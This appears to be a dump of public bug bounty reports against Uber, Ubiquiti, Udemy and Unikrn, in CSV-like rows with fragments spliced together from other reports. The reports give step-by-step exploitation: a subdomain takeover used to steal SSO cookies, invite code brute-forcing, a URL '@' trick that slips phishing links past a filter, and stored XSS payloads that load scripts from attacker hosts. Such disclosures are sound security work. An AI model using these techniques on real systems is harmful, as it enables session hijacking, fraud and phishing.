Uber,10001,0.0,over-1b,"$5,000.00",Critical,9.3,Improper Authentication - Generic,Authentication bypass on auth.uber.com via subdomain takeover of saostatic.uber.com,"arneswinnen  submitted a report to Uber.Apr 7th (6 years ago)Summary
This is not a standard vulnerability, but a chain of two more exotic vulnerabilities leading to a full authentication bypass of your SSO login system at auth.uber.com (via saostatic.uber.com). The root cause of this authentication bypass is two-fold:

Subdomain saostatic.uber.com was pointing to Amazon Cloudfront CDN, but the hostname was not registered there anymore. This allowed me to fully takeover this domain. It is now serving content of my own webserver, both over http and https (highly similar to 175070 - however, I must disagree with ""there are some mitigating factors (cookie scope) that make this not as bad as it might appear at first blush.""). 
Your SSO system at auth.uber.com issues session cookies which are temporarily shared between all https://*.uber.com subdomains through its ""domain=.uber.com"" attribute. Although there were some countermeasures to prevent theft, the current setup still allows leakage of these high-value session cookies to the overtaken subdomain https://saostatic.uber.com in all modern browsers, leading to a full Authentication Bypass (highly similar to 172137).

Security Impact
The security impact of the subdomain takeover is that Uber can be impersonated via this webpage. A valid SSL certificate could easily be generated for this domain via Let's Encrypt, which would make it ideal for e.g. phishing attacks. 
The security impact of the SSO system using shared session cookies for https://.uber.com is, in combination with the subdomain takeover vulnerability, an Authentication Bypass via session hijacking. A victim must be authenticated to auth.uber.com and then visit a webpage under the attacker's control to be exploited successfully - no further interaction is required from the victim, the attack can be performed stealthily without the user noticing or being notified by Uber. The end result is that the attacker can now impersonate the victim on any of the .uber.com which rely on auth.uber.com for authentication, such as riders.uber.com, partners.uber.com, developer.uber.com, bonjour.uber.com, etc. 
# 1. Subdomain Takeover
The subdomain ""saostatic.uber.com"" was (and still is) a CNAME pointing to a AWS Cloudfront CDN server (depending on your location, the latter will resolve differently):
Code 168 BytesWrap lines Copy Download1# nslookup saostatic.uber.com 8.8.8.8

6saostatic.uber.com	canonical name = d3i4yxtzktqr9n.cloudfront.net.
However, the hostname ""saostatic.uber.com"" was not claimed anymore on Cloudfront, resulting in a Cloudfront error page when visiting the subdomain before the takeover:

Subsequently, a new Amazon Cloudfront CDN endpoint was created and linked to an attacker-controlled origin server. For the new Cloudfront CDN endpoint, ""saostatic.uber.com"" was designated as hostname successfully:

#2. Authentication Bypass
In Uber's SSO system, auth.uber.com acts as Identity Provider and issues temporarily shared session cookies for https://*.uber.com to communicate identities to Service Providers (e.g. riders.uber.com, partners.uber.com, etc). Service Providers on their end immediately destroy the incoming temporary shared session cookies in case of erroneous (e.g. issued for other Service Provider) or successful authentication, ensuring the window for theft is small:
 {F202679}
The precious shared session cookie ""_csid"" can thus only be stolen between step 9 and 10, which is a very short period (automatic browser redirect). Although not impossible to exploit, a more convenient flaw was identified that allows the shared session cookie to remain alive after step 9 in the browser's cookie store in the diagram above. The issue is that, if the victim is already logged in at https://riders.uber.com (situation after last step 12 in diagram) when receiving a request containing a valid newly generated shared session cookie ""_csid"", it is simply ignored. Hence it stays alive in the browser until its cookie store is cleared. An attacker simply needs to directly issue another login scenario starting from step 3 in the above diagram, and end with an additional hidden request to https://saostatic.uber.com to steal the precious session cookie:
{F202676}
So now an attacker has his/her hands on the victim's ""_csid"" shared session cookie for https://riders.uber.com, he/she can execute the normal login flow in their own browser and replace the issued ""_csid"" cookie value in step 9 of the first Uber SSO Login diagram to be logged in as the victim, right? Wrong. There's another countermeasure in place, namely a variant of login cross-site request forgery protection. This is the actual updated Uber SSO Login 2 diagram:
{F202678}
The problem here are the GET param state=CSRFTOKEN and locally scoped state cookie that are added in step 3 by the Service Provider riders.uber.com and verified in step 11. Since we can't steal these values from the victim's browser, but only the ""_csid"" shared session cookie, this means game over, right?
No! An attacker can obtain a proper CSRFTOKEN value and accompanying state cookie value from https://riders.uber.com by starting a normal login scenario on their end (e.g. in their own browser or via a simple script). He/she can then relay the auth.uber.com URL to the victim's browser to get the ""_csid"" shared session cookie for these values, and inject these in his/her own browser login scenario again in step 9. In this manner, the victim effectively generates the ""_csid"" temporary session token for the attacker's login scenario in a separate browser, but this works flawlessly. This still allows exploitation and thus victim impersonation in the following manner (we still assume that the victim is already logged in to auth.uber.com and visits a webpage under control by the attacker, so we basically continue the flow from the above third and last diagram): 
{F202677}
PoC
In the PoC below, the assumption is made that https://saostatic.uber.com is actually serving a valid certificate in the victim's browser, which currently is not the case (so there is currently no actual exposed risk). I figured you might not appreciate that. 

Open the victim's browser & browse to https://riders.uber.com . After being redirected to https://auth.uber.com , login with the victim's credentials so you end up on https://riders.uber.com trips dashboard again.
Open a second browser tab in the victim's browser and browse to https://saostatic.uber.com/prepareuberattack.php . Accept any certificate warnings that you may receive here - again, we're only simulating that the domain has a valid SSL certificate. Once the page has finished loading you should see a URL, ""Cookie: "" string and a ""Set-Cookie: "" strings underneath each other. This is all info gathered under the hood by the attacker's webserver that is required to login as the victim now.
Open the separate attacker's browser and setup an intercepting proxy tool to intercept requests and responses. Browse to the URL displayed on the prepareuberattack.php page output and intercept this request. Now copy the ""Cookie: ..."" string displayed on prepareuberattack.php and paste it into the request headers. 
The response should be a redirect to https://riders.uber.com/trips, indicating successful authentication bypass. Last but not least, copy all the ""Set-Cookie: "" lines from the prepareuberattack.php page output and paste them in the response before forwarding it to the browser. This ensures that the stolen cookies are properly injected in the attacker's browser. 
You are now logged in as the victim in the attacker's browser 

In a real attack scenario, an attacker would stealthily load https://saostatic.uber.com/prepareuberattack.php in the victim's browser, e.g. through an iframe. Likewise, he/she would probably not display the URL and all the cookies on the PHP page, but store this on the server-side, ready to be abused in a stealthy fashion. 
You can see all these PoC steps executed in attachment ""8. Authentication Bypass PoC video.mp4"", where browser 1 and browser 2 had separate upstream servers and thus even other IP addresses to prove this is a plausible threat. The code of the https://saostatic.uber.com/prepareuberattack.php and https://saostatic.uber.com/uberattack.php pages is also attached (""9. prepareuberattack.php"" and ""10. uberattack.php""). This was written quick & dirty for PoC purposes - I know the code is pretty hacky.
Recommendations

The recommendation for the subdomain takeover is straightforward: remove the dangling DNS CNAME pointer to Amazon CloudFront and the issue is resolved.
The recommendation for the generic Authentication Bypass issue is a bit more problematic. The fact that identities supplied to Service Providers by the Identity Provider are communicated via shared .uber.com cookies make them susceptible for all vulnerabilities that allows insight in cookies on any .uber.com subdomain. This includes remote code execution, subdomain takeover,  debug logs, etc and has a very serious impact on Uber's overall security, even when the subdomain is hosted in a completely isolated environment.
For example, all the mentioned out of scope .uber.com subdomains in the program's listing (bizblog.uber.com, newsroom.uber.com etc) have the inherent ability to bypass authentication of any Uber user, even though they might be remotely managed by an external party with lower security standards than Uber. Ironically enough, any service that wants to benefit from the current Uber SSO system will have to receive a .uber.com subdomain, as this is required by design. This in its turn increases the attack surface for abuse of the generic Authentication Bypass.
On the short term I would recommend fixing the fact that the ""_csid"" cookie can remain alive in a browser once a user is already logged in (although Jack Whitton already showed that CSP could be abused to prevent a victim to make the request back to the Service Provider and invalidate the token, so I wouldn't put too much trust in that). On the mid-to-long term I would advise Uber to migrate to a real OAuth SSO system that communicates identity secrets and proofs by other means than shared cookies, e.g. GET parameters (OAuth ""code"" flow) or window.location.hash values (e.g. OAuth ""access tokens"" flow). 

Let me know if anything is unclear.

As you can see, there is surge of 1.3x in that area. But with this bug, one can avoid the surge. 
To explain the video in brief
First I selected Uber Go with the pickup location as ""Prestige Shantiniketan"" and destination as ""Big Brewsky"". Now the ""Share your car"" fare is 249.91 and ""Get your own car"" fare is 277.68.
Now I go back to the map screen, and I scroll to the area which has no surge. And then I click on ""set pickup location"".
In the confirmation screen, I change the pickup location to ""Prestige Shantiniketan"" (the location with surge) and use the same Destination ""Big Brewsky"". Ta-Da !! Now you can see the price without surge even though there is surge in that area (you can see surge symbol on ""Request Pool"" button). The ""Share your car"" fare is 191.48 and ""Get your own car"" fare is 212.76.
Since the UberPool fare is pre-decided, if one has booked using this bug will end up paying the non-surge price for UberPool.
PS: I've personally tried this loophole once for ""Share your car"" in the UberGo screen and it worked for me.
This bug might even work for ""Get you own car"" or UberX, where the bill generated is considering non-surge price, but I haven't tried it.

Uber,10001,0.0,over-1b,$750.00,No value,0.0,Violation of Secure Design Principles,Brute-Forcing invite codes  in partners.uber.com ,"mefkan  submitted a report to Uber.Jun 14th (6 years ago)Hi,
//We are going to use this link : https://partners.uber.com/join/?invite_code=xxxxx with GET method.
There are  options to customize codes,
We can do it with only numbers
https://partners.uber.com/join/?invite_code=1 to 10000
Or we can use some words with numbers
https://partners.uber.com/join/?invite_code=uber1 to uber10000
If the source code of  page matches with  <p class=""delta flush"">  that means the invite code exists.Or you can use other working matches.I used the <p class=""delta flush""> in the examples.
So we can brute-force.There are no limits for tries.No captchas no errors
Example links that includes money :
https://partners.uber.com/join/?invite_code=547kkgvcv $500
https://partners.uber.com/join/?invite_code=6w3wt2b8z $300
With no money:
https://partners.uber.com/join/?invite_code=mza5cmjtue
https://partners.uber.com/join/?invite_code=9cy316h6ue
https://partners.uber.com/join/?invite_code=4u8kyjxtue
https://partners.uber.com/join/?invite_code=15xvj
And I will add some examples to attachments.
So an attacker or a hacker could use it for free rides or getting money with uber,can create many accounts with every  invite code.
//The other thing about this vulnerability is you are getting some informations about members.
For example Go that page or request a GET method 
GET https://partners.uber.com/join/?invite_code=uber3958

Please note that uber only allow 3 account per device if we choose payment method as cash. But we can bypass it by taking androidId,simSerial,imsi,googleAdvertisingId,signup_session_id  in variable during Attack.

This happened on both HTTP and HTTPS. Now, as our blog post from last week says:
https://labs.detectify.com/2016/10/05/the-story-of-ev-ssl-aws-and-trailing-dot-domains/
This means that there's a high chance this domain does not have any distribution at all, and that anyone can now claim it.
I've done this as a PoC now, I haven't placed anything on the apex level, howevel if you use this URL:
http://rider.uber.com/login-poc
There's a PoC there:

Uber,10001,0.0,over-1b,"$7,000.00",No value,0.0,Code Injection,OneLogin authentication bypass on WordPress sites via XMLRPC,"jouko  submitted a report to Uber.May 15th (7 years ago)When a user logs on one of your WordPress sites via OneLogin, the authentication plugin creates a new entry in the WordPress user database with the default password @@@nopass@@@. This wouldn't be a problem if the plugin disabled all normal WordPress authentication methods, but it doesn't.
The OneLogin plugin does prevent logins through the normal wp-login.php page but fails to restrict the XMLRPC API. XMLRPC still honors the WordPress internal user database. Depending on the plugin settings, also the normal login page can be used with URL parameters: wp-login.php?normal=1. The settings did not allow this on the Uber sites I tried.
An attacker can exploit this bug by performing XMLRPC functions such as create new pages or posts and upload files. The attacker has to guess or know a username that has a default password and sufficient privileges to execute the operation. I haven't done an exhaustive test of all functions but some of them could probably be used to achieve remote code execution (e.g. creating posts containing JavaScript).
This probably affects most of your WordPress sites. I've confirmed this on love.uber.com and newsroom.uber.com by creating pages and posts (not public) and uploading files.
The XMLRPC system supports about 80 functions by default. Almost all of them require authentication. Plugins may add their own functions. Some of the function names:

Exploit scenarios#
Options in the above output that aren't marked readonly can also be changed. I didn't check if this is exploitable.
For usernames in these PoCs I used some *@uber.com email addresses I saw while testing previous bugs. They would be relatively easily guessable/findable for an attacker who doesn't have this information.

Ubiquiti Inc.,501-1000,0.0,over-1b,$500.00,High,7.95,Cross-Site Request Forgery (CSRF),Authentication bypass on sso.ubnt.com via subdomain takeover of ping.ubnt.com,"arneswinnen  submitted a report to Ubiquiti Inc..Sep 26th (6 years ago)Summary
This is not a standard vulnerability, but a chain of two more exotic vulnerabilities leading to a full authentication bypass of your SSO login system at sso.ubnt.com (via account.ubnt.com). The root cause of this authentication bypass is two-fold:

Subdomain ping.ubnt.com was pointing to Amazon Cloudfront CDN, but the hostname was not registered there anymore. This allowed me to fully takeover this domain. It is now serving content of my own webserver, both over http and https.
The session cookie of your SSO subdomain sso.ubnt.com is (deliberately?) shared with all https://*.ubnt.com subdomains through its ""domain=.ubnt.com"" attribute. This allows leakage of this high-value session cookie to the overtaken subdomain https://ping.ubnt.com in all modern browsers.

Impact
The following attack scenario was invented: Assume that a victim is logged in in his/her browser to any of the *.ubnt.com services via the SSO system at account.ubnt.com, which uses sso.ubnt.com under the hood. If an attacker can then let the victim make a request to ping.ubnt.com in a second browser tab, either on purpose or unknowingly, the browser will transparently add the session cookie ""UBIC_AUTH"" set by sso.ubnt.com to this subdomain. Since the attacker has full visibility into incoming requests to his/her webserver (in this case, mine), the session cookie is now compromised. Once the attacker's got his/her hands on the session cookie, he/she can now hijack the victim's session on sso.ubnt.com. Since sso.ubnt.com is the centralized place where authentication occurs for all *.ubnt.com services (and perhaps even on other domains via OAuth?), this is a major risk, as an attacker can now impersonate the victim on all their Ubiquity services and connected devices who rely on SSO for authentication. 
In order for this depicted attack to work, the following questions still remain:

Valid SSL Certificate: the ""UBIC_AUTH"" session cookie has the ""secure"" cookie attribute set, which instructs the browser to only send its value over a secured channel. This means that the browser will only send it to https://ping.ubnt.com but not to http://ping.ubnt.com, which now requires the attacker to have a valid SSL certificate for this domain. However, many Certificate Authorities support automated domain verification through hosting a specific HTML file in the root directory of a (sub)domain nowadays (e.g. Lets Encrypt, GoDaddy, ...). Since the subdomain takeover yields the attacker complete control over the webserver serving ping.ubnt.com, this would be trivial. This was not performed as a PoC to not upset you by generating a malicious SSL certificate for your domain and effectively deploying it on a production system, but feel free to give me a heads up if you would like me to actually proceed with this attack scenario. It is literally one command with the certbot utility and free to deploy on AWS Cloudfront. 
Request to ping.ubnt.com: In order for the attacker to convince his/her authenticated victim to make a request to the overtaken subdomain ping.ubnt.com, a number of techniques can be utilized:


Targeted attack: An attacker could simply send his/her victim a mail with an embedded 1x1 image hosted on https://ping.ubnt.com/ inside its HTML. Since email supports HTML by default, this would silently make a request to the overtaken subdomain when being rendered in the victim's browser. Another option would be to lure the victim to an arbitrary attacker-controlled domain which houses a hidden iframe to the overtaken subdomain. Again, the browser would stealthily make the request and leak the ""UBIC_AUTH"" session cookie of sso.ubnt.com to the attacker.
Mass exploitation: An attacker could again host a media resource on https://ping.ubnt.com/ and buy some advertisement space on popular websites to serve it. Every authenticated Ubiquity victim who browses here would leak his/her session cookie to the attacker unknowingly. However, to increase the likelihood that the victims are already authenticated to sso.ubnt.com, an attacker might just post a reply on https://community.ubnt.com with a hidden IMG tag and source https://ping.ubnt.com. Every logged-in reader of the reply would unknowingly make a request to the hijacked subdomain, which would go through IF there was a valid SSL Certificate installed (not currently). Here's the PoC link: https://community.ubnt.com/t5/Getting-Started-Product/2-week-old-wisp/m-p/1687239#M65439 (post of my testuser ""ferrariverdasco"" - see also attached screenshot ""1. Waterhole community reply.png""). 

# 1. Subdomain takeover
The subdomain ""ping.ubnt.com"" was (and still is) a CNAME pointing to a AWS Cloudfront CDN server (depending on your location, the latter will resolve differently):
Code 259 BytesWrap lines Copy Download1# nslookup ping.ubnt.com 8.8.8.8
2Server:		8.8.8.8
3Address:	8.8.8.8#53

5Non-authoritative answer:
6ping.ubnt.com	canonical name = dl.ubnt.com.
7dl.ubnt.com	canonical name = d2cnv2pop2xy4v.cloudfront.net.
8Name:	d2cnv2pop2xy4v.cloudfront.net
9Address: 54.192.96.244
However, the hostname ""ping.ubnt.com"" was not claimed anymore on Cloudfront, resulting in a Cloudfront error page when visiting the subdomain before the takeover (see screenshot ""2. Before takeover.png""). Subsequently, a new Amazon Cloudfront CDN endpoint was created and linked to an attacker-controlled origin server. For the new Cloudfront CDN endpoint, ""ping.ubnt.com"" was designated as hostname successfully (""3. CNAME takeover.png""). This concluded the subdomain takeover (see screenshots ""4. After takeover.png"" and ""5. After takeover - source.png""). PoC URL: http://ping.ubnt.com/34902385023958329058235.html (random filename chosen to not negatively affect Ubiquity's reputation during takeover period). 
# 2. Authentication bypass proof-of-concept
In the PoC below, the assumption is made that https://ping.ubnt.com is actually serving a valid certificate in the victim's browser, which currently is not the case (so there is currently no actual risk) - see above.

Open browser & navigate to https://ping.ubnt.com. Accept the invalid SSL certificate for PoC reasons.  Then launch an intercepting proxy tool and configure your browser proxy settings to see traffic going back & forth.
Browse to https://community.ubnt.com/t5/Getting-Started-Product/2-week-old-wisp/m-p/1687239#M65439. Find the request to https://ping.ubnt.com/imagefetch.php?f=thanks.png in the intercepting proxy and view its response (hidden in HTML comments). It should say ""Cookie named 'UBIC_AUTH' is not set!"".
Login to account.ubnt.com in a second browser tab with the victim's account. Notice the ""UBIC_AUTH"" cookie being issued by sso.ubnt.com after successful authentication, with ""domain=.ubnt.com"" attribute.
Refresh first tab https://community.ubnt.com/t5/Getting-Started-Product/2-week-old-wisp/m-p/1687239#M65439. Check in your intercepting proxy that a new request to https://ping.ubnt.com/imagefetch.php?f=thanks.png is made, with a bunch of cookies transparently added by the browser, among which UBIC_AUTH.
The HTML comment body of the response should now show the value of the UBIC_AUTH value, clearly demonstrating that the session cookie's value was well-received. However, this PHP page will make a request to endpoint https://sso.ubnt.com/api/sso/v1/user/self with this cookie and show its response. This should be a JSON array containing victim-account sensitive information, hereby proving that the session cookie can actually be hijacked and used from another system (my webserver in this case). 

In a real attack scenario, an attacker would probably want to store the received cookie locally and use a cookie addon for his/her specific browser, to inject the session cookie value in the browser more persistently, as opposed to in a webserver's PHP curl script. However, I believe this method was more clear for PoC purposes. From here on, an attacker has complete control over a victim's account. He/she can see and modify anything, as long as no extra verification is required (e.g. current password to update to a new password). This is a similar impact of a global XSS & CSRF vulnerability on all *.ubnt.com pages.
You can see all these PoC steps executed in attachment ""6. Authentication Bypass PoC video.mp4"". The code of the https://ping.ubnt.com/imagefetch.php page is also attached (""7. imagefetch.php""). 
Recommendation
The root cause of the vulnerability is the dangling CNAME pointer to Cloudfront from the affected subdomain. It is advised to remove the DNS CNAME pointer from ping.ubnt.com to the Cloudfront CDN server. This will mitigate the root cause vulnerability. If you are interested in keeping the subdomain on the Cloudfront CDN, I'll have to release it first before you can reclaim it. In that case, just let me know.
Additionally, it is advised to investigate whether the session cookie ""UBIC_AUTH"" of sso.ubnt.com should really be shared among all subdomains. This makes subdomain takeovers significantly more impactful, as shown through this report.

Udemy,1001-5000,0.0,10m-50m,$100.00,No value,0.0,Information Disclosure,"Ability to add pishing links in discusion ,"" Bypassing uneductional Links  add ""","zeyadk  submitted a report to Udemy.May 13th (8 years ago){refer to case number 247874}
Hey devs ,
IF you went in course discussion and tried to add for example "" evil.com "" it will get blocked by your system . But if you tried to add
https://support.udemy.com/ it will be added directly
So using a thing i learned in old times th ' @ ' sign after a website url like this site.com@anothersite.com it will actually redirect to to anothersite.com It is because modern browsers interpret this scheme like this ""http://authorization_data@website"", so, when You click on URL, they get You redirected to ""http://website"". so this was the way i bypassed the system adding any pishing link in the end of support.udemy.com link or any whitelisted site :
Example :
https://support.udemy.com@evil.com/
add it in a discussion and a successfull bypass is done and it will be added to discussion flawlessly .
Now ability to pish user into telling them check this support and they will be confident it's a udemy link but you will dircect them to scam site . 
Here is live example :
https://www.udemy.com/course/244336/activities?ids=1415990
So this is it you need not to allow any link with @ in it : Also if you say that the variant after @ will appear as misleading it can be URL encoded ! 
Thanks !",https://hackerone.com/reports/62301,California,United States,San Francisco,2015,5,13,14,44
Udemy,1001-5000,0.0,10m-50m,$150.00,No value,0.0,Improper Authentication - Generic,"Able to view others' gifts on /gift/share URL, giftId is predictable, and easy to manipulate","caffeinewriter  submitted a report to Udemy.Feb 27th (7 years ago)I recently purchased a gift for a friend, and noticed the share URL gift ID was simply numeric. I managed to access other people's gifts simply by incrementing and decrementing the ID by 2, I was able to verify that the price was dropped to ""Free"", regardless of if I was logged in or not, and I was able to successfully redeem a gift to an account, even if it was not associated with the gift email, or the account that initially purchased the gift. 
Scope:
This affects Udemy.com at the /gift/share/ endpoint. Reveals name and email of recipient of gift, as well as exposing the gift redemption code.
Example URLs:
https://www.udemy.com/gift/share/?giftId=559076 (mine)
https://www.udemy.com/gift/share/?giftId=559078 (not mine, but still able to access it [giftId incremented by 2])
Replication:

From a valid URL, increment or decrement the giftId parameter by 2.
Visit the course page, and add the couponCode parameter with the coupon code as the value to verify the code is valid, or enter it in the ""Redeem a Coupon"" box. 
Check out, and you will be able to redeem another person's gifts.

Suggested Actions to Rectify Issue:

Require user to be authenticated, and only allow them to view their purchased gifts.
If you want to give unauthenticated access, use randomly generated IDs instead of sequential IDs.

Summary:
I am writing to inform you of a critical information disclosure bug via an exposed Jenkins dashboard located at https://jenkins101.udemy.com. Upon navigating to this address, I was asked to authenticate with my Github account. After authenticating, I was surprised to find that I had complete access to the corresponding Jenkins Dashboard as seen in the screenshot below:

Impact:
Contained within these files was the complete Udemy Django source code. This included complete database schemas and keys/ credentials for the following services:

Crowdin
Amazon Redshift
Exchange
Facebook
Google
Maxmind
Sendgrid
Sift
Twilio
Zencoder
Level3
Apple
Salesforce
Celery
Paypal
Stripe
Freshdesk
and more

To verify that these credentials were active, I attempted to login into Sendgrid. I was able to take over the Udemy Sendgrid account as seen in the screenshot below. I did not make any change/ access any information.

Mitigation
Mitigation for this should be fairly straightforward, simply ensuring proper user authentication should prevent future unauthorized users from access the dashboard. I am not storing any of the informaiton that I came across, however, rekeying the compromised systems may not be a bad idea.
I hope this reports helps! Please let me know if you have any questions! 😁
Best,

Just curious- if this is just considered ""High"" severity what would you consider to be ""Critical"" severity. I admittedly didn't ""dig in"" too much to respect the privacy of users (as per the brief), but I would think that it can't get much more severe than this.
Cheers!acima   posted a comment. Nov 17th (6 years ago)The HackerOne severity is supposed to be CVSS based, there is a calculator here  https://www.first.org/cvss/calculator/3.0  - happy to hear how you would fill that out.
    
    
        
            
                
                
                
            
        
    
cha5m   posted a comment. Nov 17th (6 years ago)Ah yes, I opted to skip that because I think it's sometimes tough to map these config-based vulnerabilities and I instead just assigned critical as I had all of the creds. For the CIA triad, obviously it's going to be a high for confidentiality, but I could see the argument for integrity and availability as well. Attached is my best shot at it.
That said, I think the CVSS can be somewhat arbitrary and I agree with however you see it. :)
Thanks again!1 attachment:F135279: Screenshot_2016-11-17_18.10.07.png

An attacker can include any arbitrary text using specially crafted udemy url.
Reporting this but not sure if this is in scope (text injection not marked in exclusion list)
Kindly mark it as informative in case if it is out of scope
Issue seems to be because of source_page=clp param. If this is removed text injection wont work. Also it seems error handling is not proper in case of source_object_id param since this vulnerability occur when you insert a string inside source_object_id param.
Steps
1) Attacker distributed the below url by means of spamming or through his website
https://www.udemy.com/api-2.0/recommended-courses/?source_action=view&source_object=course&source_object_id=},{Kindly%20move%20to%20our%20new%20beta%20website%20evil.com&source_page=clp
2) Victim see below text
{""detail"": ""Invalid source object id: },{Kindly move to our new beta website evil.com""}
3) Since the text came from official site so user believes and gets into attacker trap

Malicious user can fill the rating form and submit it. By intercepting request to the server's API (by using intercepting proxy tool) and modify rating value he can set enormously large values as rating. After experimenting following restrictions was found:

Please add the affected domain name in the Title of the report.

Summary: Referral emails sent from unikrn.com are vulnerable to HTML injection via the first name field.
Description: Due to a lack of sanitization and validation when posting to https://unikrn.com/apiv2/user/verify a user may set a number of profile fields to values which should not be acceptable. This allows for a possible XSS within the raffle areas of the website and HTML injection within the referral email sent by unikrn.com.
The user may insert a payload into the firstname field which is later used to generate the users 'callsign'. The callsign value is safely used in other locations in the site within ng-bind attributes however in the case of viewing a raffle winner, the value is instead transformed by the 'vartrans' directive. This directive permits html to be inserted as part of the ""raffle_winner_sidebar_body"" text and is done so without any sanitization. 
Therefore should a user set their first name as '<script src=\""https://external.com/xss.js\"" />' when the user wins a raffle, any visitor to that raffles page will result in the external script being loaded.
Alongside this XSS it was also found that should a user set their first name to a value containing a script tag, when a referral email is sent to an address, any email content after the script tag is ignored. As the field's maximum length is 256 characters, an attacker would have 248 characters to craft a malicious email or instead embed an image with the email content to allow for a larger word count. 
An example payload may be
<a href=\""https://attacker/phish.php\""><img src=\""https://attacker/content.jpg\""></a><script>
Remedies for this would include proper sanitization of user fields when processed by the verify page and when passed as arguments to the vartrans directive to prevent similar issues in future, as well as a more strict content security policy and the stripping of all html characters when using user input within parameters to be used within an email.
Steps To Reproduce:
XSS:

Use the provided curl command to set a users first name to an xss payload such as <script src=\""https://external2.com/xss.js\"" />
Win a raffle
Visit the raffles page once you have been announced as a winner.
## Email HTML Injection:
Use the provided curl command to set a users first name to a payload such as <a href=\""https://attacker/phish.php\""><img src=\""https://attacker/content.jpg\""></a><script>
Navigate to the profile page and send a referral email.

One string attracted my attention - http://bin.pinion.gg/bin/flowplayer.commercial-3.2.15.swf
I submitted previously some vulnerabilities connected with this file to other programs, so easily determined that it is an outdated version of FlowPlayer (https://github.com/flowplayer/), vulnerable to XSS through remote file inclusion.
POC
http://bin.pinion.gg/bin/flowplayer.commercial-3.2.15.swf?config=http://████████/test.js
Just visit this link. Player will load my remote .js file from the my host, and display few popups with document.cookie and document.domain payloads.
Impact
The vulnerable file is hosted on out-scope subdomain, so i thinked, how it can affect security of main domains.
1) Using bin.pinion.gg deface. Because attacker can execute any JS, he can deface the page by arbitrary content
2) Using Open Redirect through window.location js payload.
3) Using setting cookie cross-domain. In this case the attacker can set arbitrary cookies to the pinion.gg or cp-ng.pinion.gg.
4) If this file is used in some instance to display some content, ads, etc. - then the instance is vulnerable to XSS.
Reproduction steps
You just need to place the malicious file to the remote host, like in this example:
http://████/test.js
and append the url to the
Code 65 BytesWrap lines Copy Download1http://bin.pinion.gg/bin/flowplayer.commercial-3.2.15.swf?config=
as parameter.
Suggested fix
I recommend you to update FlowPlayer to the latest version, or remove if not used.Summary by sp1d3rsThanks to the Unikrn team for the fast response, fix, and the bounty!
I discovered the Flash XSS issue on the one of the pinion.gg subdomains.
The XSS issue was in the outdated FlowPlayer SWF file (which suffered from some ExternalInterface.Call/clientside RFI-related issues), and was exploitable using next JS (we can call it test.js), placed on remote host, and then referenced in config URL param:
Code 525 Bytes1{
2    'log' : {
3        'level'  : 'info'
4    },
5    'clip': {
6        'autoPlay': 'true',
7        'baseUrl': 'http://stream.flowplayer.org/',
8        'onMyConnectionEvent': 'function(clip, info) {alert(/onMyConnectionEvent/)};',
9        'onStart': 'function() {alert(/onBegin/);}' 
10    },
11    'playlist': [ 
12    ],
13    'plugins': { 
14        'controls': { 
15            'url': 'http://yourhost.com/xss.swf' 
16        }
17    },
18    'onLoad': 'function() {alert(/onLoad/);}',
19    'connectionCallbacks': [ ""onMyConnectionEvent"" ]
20}
where http://yourhost.com/xss.swf - it is specially crafted SWF file, which execute arbitrary JS through ExternalInterface.Call method.
Using 
Code 94 Bytes1http://bin.pinion.gg/bin/flowplayer.commercial-3.2.15.swf?config=http://[redacted.com]/test.js
it was possible to execute any arbitrary JS in the context of subdomain.
I named it as persistent in the report title, because payload was in the stored form, but just 'flash xss' sounds more correctly. It could be turned to persistent, in case that config param actually was used somewhere.

This may be low risk impact but I need to suggest on improvement on your existing rate-limit protection on the registration page, It is an easy workaround and make the current protection more secure.
Description:
Unikrn increases the registration security by requiring user to enter a secured password and providing a rate limit on registration, after several attempt the server denies over-registration by returning ""Suspicious Activity - Multiple Accounts Detected. Please contact support at support@unikrn.com with further questions"". However the rate limit get executed in the last stage of the registration process, still allows the attacker to enumerate account on this page. 
Steps To Reproduce:

Go to https://unikrn.com/ and click ""Sign up""
Fill in the registration form
Upon submitting the form, use proxy (burp) to intercept the connection and send to repeater

After the research - except the normal successfully registration, we can categorize the server responses into 3 cases (in the following log from burp repeater):
Request/Response Case 1 - Existing email with secured password, the server returns message ""Email address already registered"":

Analyze the registration process:
As we can see from the server response, if we provide existing email the server responses ""Case 1"", if we provide non-existence email the server responses ""Case 2"" and ""Case 3"" just by the secured password condition: if we enter secured password Case 2 will be returned, else returns Case 3. From this we can analyze the registration process as:

The user fill in the form and send data to the server
The server receives request from the client and do the following task in order:


Check if email provided already in the database, if true -> return Case 1 and end the process. (Impact: user enumeration)
Check if password provided are secured (one char+numbers = 8 chars min), if false -> return Case 3 and end the process. (Impact: user enumeration)
[Rate-limit protection] Check if the attempt count reach limit, if true -> return Case 2 and end the process. (Impact: user enumeration)
If the above test pass, register the new user and return successful page.

Recommendation:
the rate-limit protection must be place on the first stage of processing, this is to disable user enumeration attack:

The user fill in the form and send data to the server
The server receives request from the client and do the following task in order:


[Rate-limit protection] Check if the attempt count reach limit, if true -> return Case 2 and end the process. (No user enumeration impact: not knowing whether the email are existing or not)
Check if email provided already in the database, if true -> return Case 1 and end the process. 
Check if password provided are secured (one char+numbers = 8 chars min), if false -> return Case 3 and end the process. (Impact: user enumeration)
If the above test pass, register the new user and return successful page.

Optional improvement:

There is no CSRF token / Captcha in the registration page, this make the enumeration process even easier.

As I say this may be low risk, but the fix is easy and increase more security on the existing protection scheme.

Unikrn,11-50,0.0,1m-10m,$100.00,Low,3.7,Improper Authentication - Generic,Staging Rabbitmq instance is exposed to the internet with default credentials,"albatraoz  submitted a report to Unikrn.Dec 7th (3 years ago)Description:
RabbitMQ is an open-source message-broker software (sometimes called message-oriented middleware) that originally implemented the Advanced Message Queuing Protocol (AMQP) and has since been extended with a plug-in architecture to support Streaming Text Oriented Messaging Protocol (STOMP), Message Queuing Telemetry Transport (MQTT), and other protocols.
The instance of the rabbitmq of unikrn is exposed to the internet with the default credentials guest:guest which has an administrative access.
Steps To Reproduce:

Visit ███████
Enter user as guest & password as guest.
Boom!! You are inside the management console of the rabbitmq of unikrn.

P.S I checked that the ssl certificates belong to domain *.dev.unikrn.space which proves that the instance belongs to unikrn and maybe used for production or development.
Mitigation
Don't expose the rabbitmq console on the internet & remove the default credentials.

Impact
The impact is critical as the attacker can get hell lot of details by dumping the queues as the queues are having confidential details like sso details & api details for different assets. Also the default credential has the administrative access which can help the attacker to add a new queue, modify or delete an existing queue etc.Summary by albatraozCheckout this article :

Unikrn,11-50,0.0,1m-10m,$400.00,No value,0.0,Code Injection,Urgent: Server side template injection via Smarty template allows for RCE,"yaworsk  submitted a report to Unikrn.Aug 29th (6 years ago)Hi All,
I've found an issue which has allowed me to execute file_get_contents and extract your /etc/passwd file.
Description
